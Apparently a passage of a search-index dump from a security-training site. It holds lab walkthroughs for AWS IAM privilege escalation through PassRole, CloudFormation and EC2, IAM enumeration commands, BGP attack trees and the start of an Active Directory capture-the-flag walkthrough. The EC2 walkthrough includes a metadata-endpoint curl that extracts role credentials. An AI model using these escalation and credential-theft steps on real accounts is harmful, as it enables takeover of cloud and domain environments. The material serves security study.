┌──(kali㉿kali)-[~] └─$ aws iam attach-user-policy --user-name student --policy-arn arn:aws:iam::aws:policy/AdministratorAccess Check with: ┌──(kali㉿kali)-[~] └─$ aws iam list-attached-user-policies --user-name student { \"AttachedPolicies\": [ { \"PolicyName\": \"AdministratorAccess\", \"PolicyArn\": \"arn:aws:iam::aws:policy/AdministratorAccess\" }, { \"PolicyName\": \"IAMReadOnlyAccess\", \"PolicyArn\": \"arn:aws:iam::aws:policy/IAMReadOnlyAccess\" }, { \"PolicyName\": \"Service\", \"PolicyArn\": \"arn:aws:iam::862839114976:policy/Service\" } ] } Try creating a new user named Bob again: ┌──(kali㉿kali)-[~] └─$ aws iam create-user --user-name Bob { \"User\": { \"Path\": \"/\", \"UserName\": \"Bob\", \"UserId\": \"AIDA4RZJYBTQHLY5KDFRX\", \"Arn\": \"arn:aws:iam::862839114976:user/Bob\", \"CreateDate\": \"2023-05-11T09:11:37+00:00\" } } Successfully performed a privileged operation.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "02dda8bdd3d5b847d7135928ed35bda1",
    "u": "https://cloud.tymyrddin.dev/docs/iam/enum-iam",
    "t": "IAM enumeration ",
    "c": "IAM enumeration  Objective: Using the access credentials, enumerate users, roles, and policies on the AWS account Console Based Enumeration  Click on the lab link button to get access to the AWS lab credentials. Sign-in into the AWS console. Search for the IAM dashboard and navigate to it. Click on Users . To enumerate a user click on the username. Check user Permissions and policies. Check Groups for the user. Check the user’s Security credentials . Similarly check for other user’s permissions. Check Groups and Security credentials for the user. Check the user’s access keys and ssh keys. Click on Groups on the left panel to enumerate groups. Click on the group name to open group details. Check for the users that are part of the group. Check the for the group attached policies. Similarly check for the other groups. Click on Policies in the left pane to enumerate policies. Check Customer-managed and AWS managed policies. Click on the policy name to enumerate the policy. Check policy document, policy usages and policy permissions. Similarly enumerate other AWS managed policies. Click on Roles on the left panel to enumerate roles. Click on role name to enumerate roles for the AWS account. Check the role trust policy. Check role’s Trusted entities . Check the role’s inline policies. Check the role’s Trusted entities . Similarly enumerate other roles. CLI Based Enumeration  Click on the lab link button to get access to the AWS lab credentials. Configure AWS CLI to use the provided credentials. aws configure Get a list of the users on the AWS account. Briefly check UserName, UserId and Arns. aws iam list-users Check groups for users. aws iam list-groups-for-user --user-name ad-adminson Check policies attached to the user. aws iam list-attached-user-policies --user-name ad-user Check for any signing certificates for the user. aws iam list-signing-certificates --user-name ad-user Check for any public ssh keys for the user. aws iam list-ssh-public-keys --user-name ad-user Get ssh key details. aws iam get-ssh-public-key --user-name ad-user --encoding PEM --ssh-public-key-id APKAUAWOPGE5M47NZEIT Check for MFA devices for users. aws iam list-virtual-mfa-devices Check for user login profile. aws iam get-login-profile --user-name ad-user Enumerate groups for the AWS account. aws iam list-groups Check which policies are attached to the group to enumerate permissions. aws iam list-group-policies --group-name ad-admin aws iam list-attached-group-policies --group-name ad-admin Enumerate policies for the AWS account. Without any filter the command will return all the IAM managed policies (AWS Managed Policy + Customer Managed Policies). aws iam list-policies Without any filter the command will return all the IAM managed policies (AWS Managed Policy + Customer Managed Policies) Search for customer managed policies. aws iam list-policies --scope Local | grep -A2 PolicyName The command aws iam list-policies –scope Local will return the customer managed policies. grep -A2 PolicyName > is used to search for the PolicyName string and the next two lines after the string match. Check for policy details of ad-customer-managed-policy. aws iam get-policy --policy-arn arn:aws:iam::276384657722:policy/ad-customer-managed-policy Get the policy version document to check permissions that the policy grants. aws iam get-policy-version --policy-arn arn:aws:iam::276384657722:policy/ad-customer-managed-policy --version-id v1 Enumerate roles on the AWS account. aws iam list-roles Check details for roles. aws iam get-role --role-name ad-loggingrole This role can be assumed by any AWS resource. Check for policies attached to roles. aws iam list-attached-role-policies --role-name ad-loggingrole aws iam list-role-policies --role-name ad-loggingrole Resources  AWS CLI",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "fcf679d19233a6ecab3ee75957183458",
    "u": "https://cloud.tymyrddin.dev/docs/iam/pass-role-formation",
    "t": "Pass Role: CloudFormation ",
    "c": "Pass Role: CloudFormation  Overly Permissive Permission can be abused by a user to perform privileged operations. Objective: Leverage the policy attached to the student user and attain administrative privileges on the AWS account. ┌──(kali㉿kali)-[~] └─$ aws iam list-attached-user-policies --user-name student { \"AttachedPolicies\": [ { \"PolicyName\": \"IAMReadOnlyAccess\", \"PolicyArn\": \"arn:aws:iam::aws:policy/IAMReadOnlyAccess\" } ] } ┌──(kali㉿kali)-[~] └─$ aws iam list-user-policies --user-name student { \"PolicyNames\": [ \"terraform-20230512181254610400000001\" ] } ┌──(kali㉿kali)-[~] └─$ aws iam get-user-policy --user-name student --policy-name terraform-20230512181254610400000001 { \"UserName\": \"student\", \"PolicyName\": \"terraform-20230512181254610400000001\", \"PolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Action\": [ \"iam:PassRole\", \"cloudformation:Describe*\", \"cloudformation:List*\", \"cloudformation:Get*\", \"cloudformation:CreateStack\", \"cloudformation:UpdateStack\", \"cloudformation:ValidateTemplate\", \"cloudformation:CreateUploadBucket\" ], \"Effect\": \"Allow\", \"Resource\": \"*\" } ] } } ┌──(kali㉿kali)-[~] └─$ aws iam list-roles { \"Roles\": [ { \"Path\": \"/aws-service-role/ops.apigateway.amazonaws.com/\", \"RoleName\": \"AWSServiceRoleForAPIGateway\", \"RoleId\": \"AROA23X2D5M7U63AZG7PK\", \"Arn\": \"arn:aws:iam::746775112511:role/aws-service-role/ops.apigateway.amazonaws.com/AWSServiceRoleForAPIGateway\", \"CreateDate\": \"2022-08-16T16:44:28+00:00\", \"AssumeRolePolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Service\": \"ops.apigateway.amazonaws.com\" }, \"Action\": \"sts:AssumeRole\" } ] }, \"Description\": \"The Service Linked Role is used by Amazon API Gateway.\", \"MaxSessionDuration\": 3600 }, { \"Path\": \"/aws-service-role/autoscaling.amazonaws.com/\", \"RoleName\": \"AWSServiceRoleForAutoScaling\", \"RoleId\": \"AROA23X2D5M74UFNWJJFQ\", \"Arn\": \"arn:aws:iam::746775112511:role/aws-service-role/autoscaling.amazonaws.com/AWSServiceRoleForAutoScaling\", \"CreateDate\": \"2022-08-07T20:59:16+00:00\", \"AssumeRolePolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Service\": \"autoscaling.amazonaws.com\" }, \"Action\": \"sts:AssumeRole\" } ] }, \"Description\": \"Default Service-Linked Role enables access to AWS Services and Resources used or managed by Auto Scaling\", \"MaxSessionDuration\": 3600 }, { \"Path\": \"/aws-service-role/cloudtrail.amazonaws.com/\", \"RoleName\": \"AWSServiceRoleForCloudTrail\", \"RoleId\": \"AROA23X2D5M7RNDZNTHL7\", \"Arn\": \"arn:aws:iam::746775112511:role/aws-service-role/cloudtrail.amazonaws.com/AWSServiceRoleForCloudTrail\", \"CreateDate\": \"2022-08-04T14:13:48+00:00\", \"AssumeRolePolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Service\": \"cloudtrail.amazonaws.com\" }, \"Action\": \"sts:AssumeRole\" } ] }, \"MaxSessionDuration\": 3600 }, { \"Path\": \"/aws-service-role/organizations.amazonaws.com/\", \"RoleName\": \"AWSServiceRoleForOrganizations\", \"RoleId\": \"AROA23X2D5M7YFUJWGYUS\", \"Arn\": \"arn:aws:iam::746775112511:role/aws-service-role/organizations.amazonaws.com/AWSServiceRoleForOrganizations\", \"CreateDate\": \"2022-08-04T14:10:46+00:00\", \"AssumeRolePolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Service\": \"organizations.amazonaws.com\" }, \"Action\": \"sts:AssumeRole\" } ] }, \"Description\": \"Service-linked role used by AWS Organizations to enable integration of other AWS services with Organizations.\", \"MaxSessionDuration\": 3600 }, { \"Path\": \"/aws-service-role/support.amazonaws.com/\", \"RoleName\": \"AWSServiceRoleForSupport\", \"RoleId\": \"AROA23X2D5M7QNSNN74XS\", \"Arn\": \"arn:aws:iam::746775112511:role/aws-service-role/support.amazonaws.com/AWSServiceRoleForSupport\", \"CreateDate\": \"2022-08-04T14:10:45+00:00\", \"AssumeRolePolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Service\": \"support.amazonaws.com\" }, \"Action\": \"sts:AssumeRole\" } ] }, \"Description\": \"Enables resource access for AWS to provide billing, administrative and support services\", \"MaxSessionDuration\": 3600 }, { \"Path\": \"/aws-service-role/trustedadvisor.amazonaws.com/\", \"RoleName\": \"AWSServiceRoleForTrustedAdvisor\", \"RoleId\": \"AROA23X2D5M7USKW64IQJ\", \"Arn\": \"arn:aws:iam::746775112511:role/aws-service-role/trustedadvisor.amazonaws.com/AWSServiceRoleForTrustedAdvisor\", \"CreateDate\": \"2022-08-04T14:10:45+00:00\", \"AssumeRolePolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Service\": \"trustedadvisor.amazonaws.com\" }, \"Action\": \"sts:AssumeRole\" } ] }, \"Description\": \"Access for the AWS Trusted Advisor Service to help reduce cost, increase performance, and improve security of your AWS environment.\", \"MaxSessionDuration\": 3600 }, { \"Path\": \"/\", \"RoleName\": \"lab12CFDeployRole\", \"RoleId\": \"AROA23X2D5M7WDBZEFLWP\", \"Arn\": \"arn:aws:iam::746775112511:role/lab12CFDeployRole\", \"CreateDate\": \"2023-05-12T18:12:54+00:00\", \"AssumeRolePolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Service\": \"cloudformation.amazonaws.com\" }, \"Action\": \"sts:AssumeRole\" } ] }, \"MaxSessionDuration\": 3600 }, { \"Path\": \"/\", \"RoleName\": \"TheOracle\", \"RoleId\": \"AROA23X2D5M732KK7F4EK\", \"Arn\": \"arn:aws:iam::746775112511:role/TheOracle\", \"CreateDate\": \"2022-08-04T14:10:45+00:00\", \"AssumeRolePolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"AWS\": [ \"arn:aws:iam::002763723555:root\", \"arn:aws:iam::719592403832:root\" ] }, \"Action\": \"sts:AssumeRole\" } ] }, \"MaxSessionDuration\": 3600 } ] } \"CreateDate\": \"2023-05-12T18:12:54+00:00\", \"AssumeRolePolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Service\": \"cloudformation.amazonaws.com\" }, \"Action\": \"sts:AssumeRole\" } ] }, \"MaxSessionDuration\": 3600 }, { \"Path\": \"/\", \"RoleName\": \"TheOracle\", \"RoleId\": \"AROA23X2D5M732KK7F4EK\", \"Arn\": \"arn:aws:iam::746775112511:role/TheOracle\", \"CreateDate\": \"2022-08-04T14:10:45+00:00\", \"AssumeRolePolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"AWS\": [ \"arn:aws:iam::002763723555:root\", \"arn:aws:iam::719592403832:root\" ] }, \"Action\": \"sts:AssumeRole\" } ] }, \"MaxSessionDuration\": 3600 } ] } (END) ┌──(kali㉿kali)-[~] ┌──(kali㉿kali)-[~] └─$ aws iam list-role-policies --role-name lab12CFDeployRole { \"PolicyNames\": [ \"terraform-20230512181255112200000003\" ] } ┌──(kali㉿kali)-[~] └─$ aws iam get-role-policy --role-name lab12CFDeployRole --policy-name terraform-20230512181255112200000003 { \"RoleName\": \"lab12CFDeployRole\", \"PolicyName\": \"terraform-20230512181255112200000003\", \"PolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Action\": [ \"iam:PutUserPolicy\" ], \"Effect\": \"Allow\", \"Resource\": \"*\" } ] } }",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "8937ee9c47f03bcf8a75ec5199db5ce8",
    "u": "https://cloud.tymyrddin.dev/docs/api/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  AWS API Gateway acts as the front door for applications to access data, business logic, or functionality from backend services. Why?  AWS API Gateway provides scalability across different components, and a new gate for attackers. How?  API gateway enumeration Verb tampering Misconfigured private API IAM based authentication Denial of service Poor Lambda authoriser",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "179172f8430ad768be2ab29cab83dc49",
    "u": "https://cloud.tymyrddin.dev/docs/iam/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Pentester Academy labs for identifying, enumerating and exploiting overly permissive IAM users, roles and policies. Why?  AWS Policies are a key foundation in good cloud security, but they are often overlooked. How?  IAM enumeration Misconfigured trust policy Overly permissive permission I Dangerous policy combination I Dangerous policy combination II Overly permissive permission II Pass Role: EC2 Pass Role: Lambda Pass Role: CloudFormation",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "2f601e898d206c6c5ceef7021e9f7f27",
    "u": "https://cloud.tymyrddin.dev/docs/iam/pass-role-ec2",
    "t": "Pass Role: EC2 ",
    "c": "Pass Role: EC2  Overly Permissive Permission can be abused by a user to perform privileged operations. Objective: Leverage the policy attached to the student user and attain administrative privileges on the AWS account. The student user can PassRole on any resource as well as has control over EC2 instances and SSM (AWS Systems Manager). Hence, the user can pass a role to an EC2 instance and run it. via SSM List role on AWS account which can be passed to EC2 service: ┌──(kali㉿kali)-[~] └─$ aws iam list-roles { \"Roles\": [ ... { \"Path\": \"/\", \"RoleName\": \"ec2admin\", \"RoleId\": \"AROARE66LHOVV2VPWYOZK\", \"Arn\": \"arn:aws:iam::079386327979:role/ec2admin\", \"CreateDate\": \"2023-05-12T11:56:29+00:00\", \"AssumeRolePolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Service\": \"ec2.amazonaws.com\" }, \"Action\": \"sts:AssumeRole\" } ] }, \"MaxSessionDuration\": 3600 }, ... ] } Check ec2admin role policies and permissions: ┌──(kali㉿kali)-[~] └─$ aws iam list-role-policies --role-name ec2admin { \"PolicyNames\": [ \"terraform-20230512115630147100000003\" ] } Check policy permissions: ┌──(kali㉿kali)-[~] └─$ aws iam get-role-policy --role-name ec2admin --policy-name terraform-20230512115630147100000003 { \"RoleName\": \"ec2admin\", \"PolicyName\": \"terraform-20230512115630147100000003\", \"PolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Action\": \"*\", \"Resource\": \"*\" } ] } } The ec2admin role allows AdministratorAccess on the AWS account. Find AMI id for Amazon Linux 2 AMI: ┌──(kali㉿kali)-[~] └─$ aws ec2 describe-images --owners amazon --filters 'Name=name,Values=amzn-ami-hvm-*-x86_64-gp2' 'Name=state,Values=available' --output json |jq -r '.Images | sort_by(.CreationDate) | last(.[]).ImageId' ami-00f1dd92f5c4956da The AMI id is ami-00f1dd92f5c4956da Check the subnets available in the AWS account: ┌──(kali㉿kali)-[~] └─$ aws ec2 describe-subnets { \"Subnets\": [ { \"AvailabilityZone\": \"us-east-1e\", \"AvailabilityZoneId\": \"use1-az3\", \"AvailableIpAddressCount\": 247, \"CidrBlock\": \"10.0.1.0/24\", \"DefaultForAz\": false, \"MapPublicIpOnLaunch\": false, \"MapCustomerOwnedIpOnLaunch\": false, \"State\": \"available\", \"SubnetId\": \"subnet-03efab3cb920c03ed\", \"VpcId\": \"vpc-041bfbb369de7dace\", \"OwnerId\": \"079386327979\", \"AssignIpv6AddressOnCreation\": false, \"Ipv6CidrBlockAssociationSet\": [], \"SubnetArn\": \"arn:aws:ec2:us-east-1:079386327979:subnet/subnet-03efab3cb920c03ed\", \"EnableDns64\": false, \"Ipv6Native\": false, \"PrivateDnsNameOptionsOnLaunch\": { \"HostnameType\": \"ip-name\", \"EnableResourceNameDnsARecord\": false, \"EnableResourceNameDnsAAAARecord\": false } } ] } Make a note of SubnetId . Check security groups for ec2 service: ┌──(kali㉿kali)-[~] └─$ aws ec2 describe-security-groups { \"SecurityGroups\": [ ... { \"Description\": \"FullAccess\", \"GroupName\": \"FullAccess\", \"IpPermissions\": [ { \"IpProtocol\": \"-1\", \"IpRanges\": [ { \"CidrIp\": \"0.0.0.0/0\" } ], \"Ipv6Ranges\": [], \"PrefixListIds\": [], \"UserIdGroupPairs\": [] } ], \"OwnerId\": \"079386327979\", \"GroupId\": \"sg-0ba7b7a5554178517\", \"IpPermissionsEgress\": [ { \"IpProtocol\": \"-1\", \"IpRanges\": [ { \"CidrIp\": \"0.0.0.0/0\" } ], \"Ipv6Ranges\": [], \"PrefixListIds\": [], \"UserIdGroupPairs\": [] } ], \"VpcId\": \"vpc-041bfbb369de7dace\" } ] } Make a note of the security group id. List instance profiles for the AWS account: ┌──(kali㉿kali)-[~] └─$ aws iam list-instance-profiles { \"InstanceProfiles\": [ { \"Path\": \"/\", \"InstanceProfileName\": \"ec2_admin\", \"InstanceProfileId\": \"AIPARE66LHOV32VYGVJ3M\", \"Arn\": \"arn:aws:iam::079386327979:instance-profile/ec2_admin\", \"CreateDate\": \"2023-05-12T11:56:30+00:00\", \"Roles\": [ { \"Path\": \"/\", \"RoleName\": \"ec2admin\", \"RoleId\": \"AROARE66LHOVV2VPWYOZK\", \"Arn\": \"arn:aws:iam::079386327979:role/ec2admin\", \"CreateDate\": \"2023-05-12T11:56:29+00:00\", \"AssumeRolePolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Service\": \"ec2.amazonaws.com\" }, \"Action\": \"sts:AssumeRole\" } ] } } ] } ] } Make a note of the ec2 instance profile name. Start an ec2 instance using collected details: ┌──(kali㉿kali)-[~] └─$ aws ec2 run-instances --subnet-id subnet-03efab3cb920c03ed --image-id ami-00f1dd92f5c4956da --iam-instance-profile Name=ec2_admin --instance-type t2.micro --security-group-ids \"sg-0ba7b7a5554178517\" { \"Groups\": [], \"Instances\": [ { \"AmiLaunchIndex\": 0, \"ImageId\": \"ami-00f1dd92f5c4956da\", \"InstanceId\": \"i-0717ef48404b5ab06\", \"InstanceType\": \"t2.micro\", \"LaunchTime\": \"2023-05-12T12:42:16+00:00\", \"Monitoring\": { \"State\": \"disabled\" }, \"Placement\": { \"AvailabilityZone\": \"us-east-1e\", \"GroupName\": \"\", \"Tenancy\": \"default\" }, \"PrivateDnsName\": \"ip-10-0-1-177.ec2.internal\", \"PrivateIpAddress\": \"10.0.1.177\", \"ProductCodes\": [], \"PublicDnsName\": \"\", \"State\": { \"Code\": 0, \"Name\": \"pending\" }, \"StateTransitionReason\": \"\", \"SubnetId\": \"subnet-03efab3cb920c03ed\", \"VpcId\": \"vpc-041bfbb369de7dace\", \"Architecture\": \"x86_64\", \"BlockDeviceMappings\": [], \"ClientToken\": \"2dcb85fa-f35d-4eb5-b237-aa14fcb074a9\", \"EbsOptimized\": false, \"EnaSupport\": true, \"Hypervisor\": \"xen\", \"IamInstanceProfile\": { \"Arn\": \"arn:aws:iam::079386327979:instance-profile/ec2_admin\", \"Id\": \"AIPARE66LHOV32VYGVJ3M\" }, \"NetworkInterfaces\": [ { \"Attachment\": { \"AttachTime\": \"2023-05-12T12:42:16+00:00\", \"AttachmentId\": \"eni-attach-0b91e698acd285731\", \"DeleteOnTermination\": true, \"DeviceIndex\": 0, \"Status\": \"attaching\", \"NetworkCardIndex\": 0 }, \"Description\": \"\", \"Groups\": [ { \"GroupName\": \"FullAccess\", \"GroupId\": \"sg-0ba7b7a5554178517\" } ], \"Ipv6Addresses\": [], \"MacAddress\": \"06:a2:32:cd:92:87\", \"NetworkInterfaceId\": \"eni-0e70518e5a1afee36\", \"OwnerId\": \"079386327979\", \"PrivateDnsName\": \"ip-10-0-1-177.ec2.internal\", \"PrivateIpAddress\": \"10.0.1.177\", \"PrivateIpAddresses\": [ { \"Primary\": true, \"PrivateDnsName\": \"ip-10-0-1-177.ec2.internal\", \"PrivateIpAddress\": \"10.0.1.177\" } ], \"SourceDestCheck\": true, \"Status\": \"in-use\", \"SubnetId\": \"subnet-03efab3cb920c03ed\", \"VpcId\": \"vpc-041bfbb369de7dace\", \"InterfaceType\": \"interface\" } ], \"RootDeviceName\": \"/dev/xvda\", \"RootDeviceType\": \"ebs\", \"SecurityGroups\": [ { \"GroupName\": \"FullAccess\", \"GroupId\": \"sg-0ba7b7a5554178517\" } ], \"SourceDestCheck\": true, \"StateReason\": { \"Code\": \"pending\", \"Message\": \"pending\" }, \"VirtualizationType\": \"hvm\", \"CpuOptions\": { \"CoreCount\": 1, \"ThreadsPerCore\": 1 }, \"CapacityReservationSpecification\": { \"CapacityReservationPreference\": \"open\" }, \"MetadataOptions\": { \"State\": \"pending\", \"HttpTokens\": \"optional\", \"HttpPutResponseHopLimit\": 1, \"HttpEndpoint\": \"enabled\", \"HttpProtocolIpv6\": \"disabled\", \"InstanceMetadataTags\": \"disabled\" }, \"EnclaveOptions\": { \"Enabled\": false }, \"PrivateDnsNameOptions\": { \"HostnameType\": \"ip-name\", \"EnableResourceNameDnsARecord\": false, \"EnableResourceNameDnsAAAARecord\": false }, \"MaintenanceOptions\": { \"AutoRecovery\": \"default\" }, \"CurrentInstanceBootMode\": \"legacy-bios\" } ], \"OwnerId\": \"079386327979\", \"ReservationId\": \"r-016cf1e6bd5c64fc1\" } Run commands on the remote ec2 instance using SSM: ┌──(kali㉿kali)-[~] └─$ aws ssm send-command --document-name \"AWS-RunShellScript\" --parameters 'commands=[\"curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2admin/\"]' --targets \"Key=instanceids,Values=i-0717ef48404b5ab06\" --comment \"Retrieving Token\" { \"Command\": { \"CommandId\": \"f6ad576a-e890-4d35-bca5-5c03843e0f98\", \"DocumentName\": \"AWS-RunShellScript\", \"DocumentVersion\": \"$DEFAULT\", \"Comment\": \"Retrievong Token\", \"ExpiresAfter\": \"2023-05-12T10:49:11.764000-04:00\", \"Parameters\": { \"commands\": [ \"curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2admin/\" ] }, \"InstanceIds\": [], \"Targets\": [ { \"Key\": \"instanceids\", \"Values\": [ \"i-0717ef48404b5ab06\" ] } ], \"RequestedDateTime\": \"2023-05-12T08:49:11.764000-04:00\", \"Status\": \"Pending\", \"StatusDetails\": \"Pending\", \"OutputS3Region\": \"us-east-1\", \"OutputS3BucketName\": \"\", \"OutputS3KeyPrefix\": \"\", \"MaxConcurrency\": \"50\", \"MaxErrors\": \"0\", \"TargetCount\": 0, \"CompletedCount\": 0, \"ErrorCount\": 0, \"DeliveryTimedOutCount\": 0, \"ServiceRole\":...",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "7169c009a80d79e4462ab38b10490cdf",
    "u": "https://network.tymyrddin.dev/",
    "t": "Riches in the ground ",
    "c": "Riches in the ground  How the Mycelium Whispers Its Maps Imagine the Internet as a giant, constantly shifting map where every network (run by companies like Google, ISPs, or cloud providers) has to figure out how to send data to every other network. This is not done with a single master plan. It works through a mix of cooperation, handshake agreements, and some technology under the hood. When one digs deep enough though … Also see Network mitigations Rootways of the World Tree Rootways of the World Tree Transmission Control Protocol (TCP) Network Layer Protocol (IPv4 or IPv6) Border Gateway Protocol (BGP) BGPsec validation Internet Control Message Protocol (ICMP) Domain Name System (DNS) TLS/SSL (for BGPsec) TCP-AO (Authentication Option) MD5 (for TCP-AO) Resource Public Key Infrastructure (RPKI) Mycelium Patch Mycelium patches Routing Information Protocol (RIP) Enhanced Interior Gateway Routing Protocol (EIGRP) Open Shortest Path First (OSPF) Intermediate System to Intermediate System (IS-IS) Border Gateway Protocol (BGP) Static routing First-Hop Redundancy Protocols (HSRP/VRRP) The Spore-Thief's Grimoire The Spore-Thief’s Grimoire Packet manipulation Wireless intrusions Bluetooth barrages Network access altercations Internet incursions Transport raids Application layer hacks Name resolution skirmishes Active directory run-ins Spore Nursery (Other locations) Mimic Mushrooms Tidefinger Lichen Driftspore Lanterns Moonlit Readying (Other locations) Mapping the Dew Trails Counting the Fruiting Bodies Blight-Weaver's Spore-Songs MAC changer ARP spoofer File interceptor Code injector Client-server skeleton Network scanner DNS spoofer Packet sniffer Netcat replace Wireless TryHackMe grotto Introduction Attacktive directory Attacking kerberos More caves Mythical blue lake (scenario) Tomes  https://nostarch.com/nsm https://www.packtpub.com/product/packet-analysis-with-wireshark/9781785887819 https://nostarch.com/networkprotocols https://www.packtpub.com/product/nmap-network-exploration-and-security-auditing-cookbook-third-edition/9781838649357 https://nostarch.com/black-hat-python2E https://www.wiley.com/en-us/Artificial+Intelligence+and+Data+Mining+Approaches+in+Security+Frameworks-p-9781119760436",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "be61d0607cfd6c0306a496032db0aad6",
    "u": "https://network.tymyrddin.dev/docs/notes/readme",
    "t": "The Spore-Thief’s Grimoire ",
    "c": "The Spore-Thief’s Grimoire  What?  The sacred-dark art of exposing weaknesses in the mycelial tapestry: I. The Threefold Path of Revelation Tracing the Mother-Root’s Crooked Growth (Design flaws in the fungal network’s core) Listening for Broken Mycelial Hymns (Implementation errors in spore channels) Marking the Withering Vein-Paths (Neglected maintenance of fungal highways) II. Where the Grove Bleeds Sweetest Tangled Hyphal Knots (Misconfigured spore dispersal systems) The Honeycomb’s Missing Walls (Faulty filtration membranes/firewalls) Elder Caps Gathering Mold (Aging fruiting bodies/outdated systems) Drunkard’s Spore Channels (Unsecured nutrient exchange protocols) Moonlit Root-Bare Patches (Unnecessary exposed mycelial strands) III. The Thief’s Fivefold Methodology The Blind Hypha’s Dance (Passive spore collection/recon) Tasting the Vein-Wine (Active probing of nutrient flows) Counting the Exposed Gills (Enumeration of fruiting bodies) The Rot’s Whispered Map (Documenting vulnerable pathways) Blight’s Shopping List (Prioritizing targets by sweetness) IV. Omen Verses (Signs of Weakness) When the mycelium sings off-key (Service anomalies) Where the cap’s underside shows bruising (Unpatched systems) When the earth coughs black dust (Security log alerts) Why?  To be able to dig (deeper) and find more interesting spores. How?  Packet manipulation Wireless intrusions Bluetooth barrages Network access altercations Internet incursions Transport raids Application layer hacks Name resolution skirmishes Active directory run-ins",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "d5f3617b4031a0e24632becdb3d59ffc",
    "u": "https://network.tymyrddin.dev/docs/patches/bgp",
    "t": "Border Gateway Protocol (BGP) ",
    "c": "Border Gateway Protocol (BGP)  Table of Contents Border Gateway Protocol (BGP) Attack tree for BGP in Local Networks Notes Attack tree for BGP in Local Networks  1. Hijack BGP Routes (OR) 1.1. Spoof BGP Announcements (OR) 1.1.1. Advertise Fake Prefixes (Prefix Hijacking) 1.1.2. Announce More Specific Routes (Traffic Interception) 1.1.3. Modify AS_PATH Attributes (Path Shortening/Elongation) 1.2. Exploit Weak or Missing Authentication (OR) 1.2.1. Bypass TCP MD5 Authentication (Session Spoofing) 1.2.2. Exploit Misconfigured Route Filters (Route Leak) 1.3. Manipulate BGP Attributes (OR) 1.3.1. Alter LOCAL_PREF (Influence Outbound Traffic) 1.3.2. Modify COMMUNITY Values (Bypass Policy Controls) 1.4. Exploit BGP Session Establishment (OR) 1.4.1. Fake BGP Peer (Session Takeover) 1.4.2. Abuse BGP Graceful Restart (DoS + Route Poisoning) 1.5. Man-in-the-Middle (MITM) Attacks (AND) 1.5.1. Intercept BGP Sessions (TCP Hijacking) 1.5.2. Inject Malicious Updates (Route Manipulation) 2. Denial-of-Service (DoS) Against BGP (OR) 2.1. Flood BGP with Malicious Updates 2.1.1. Send Excessive UPDATE Messages (CPU Overload) 2.1.2. Advertise Flapping Routes (Route Instability) 2.2. Exploit BGP Convergence (OR) 2.2.1. Trigger Constant Route Withdrawals/Announcements 2.2.2. Exhaust Router Memory with Large Routing Tables 2.3. Resource Exhaustion (OR) 2.3.1. Overload BGP Process with Malicious Keepalives 2.3.2. Exploit BGP Finite State Machine (Session Resets) 3. Information Leakage & Reconnaissance (OR) 3.1. Passive Eavesdropping on BGP Sessions 3.1.1. Capture Unencrypted BGP Updates (Topology Discovery) 3.2. Exploit BGP Communities & Attributes 3.2.1. Infer Internal Policies via Leaked COMMUNITY Values Notes  Local networks often lack RPKI/ROV, making prefix hijacking easier. TCP MD5 is weak against offline brute-force attacks. Route leaks are common due to misconfigured filters.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "4470c3feec05dd63b39f7a7da8e6fb47",
    "u": "https://network.tymyrddin.dev/docs/thm/attacktive",
    "t": "Attacktive directory ",
    "c": "Attacktive directory  The example was made from doing the THM: Attacktive Directory room Attack tree  1 Discovery (AND) 1.1 Scan ports 1.2 Enumerate 139/445 2 Enumerate DC users (AND) 3 Exploit Kerberos 3.1 Query a ticket from users (if possible) (AND) 3.2 Crack the hash 4 Enumerate the DC further (AND) 4.1 Map remote SMB shares 4.2 Search for information for further escalation 4.3 Decode or crack if necessary 5 Elevate privileges within the domain 5.1 Dump ntds.dit 5.2 Get administrators NTLM hash 5.3 Pass the hash with Evil-WinRM Scan with nmap  # nmap -sV -sC -T4 <IP address target> Enumerate 139/445  # enum4linux <IP address target> Enumerate the DC  Add the following line to /etc/hosts file: <IP address target> spookysec.local Download the user list and password list in the ~/Downloads directory: wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt Run the kerbrute command in the ~/Downloads directory: # /opt/kerbrute/kerbrute userenum --dc spookysec.local -d spookysec.local userlist.txt -t 100 Exploiting Kerberos  Kerberos pre-authentication has been disabled for svc-admin. Get the ticket: # cd /opt/impacket/examples 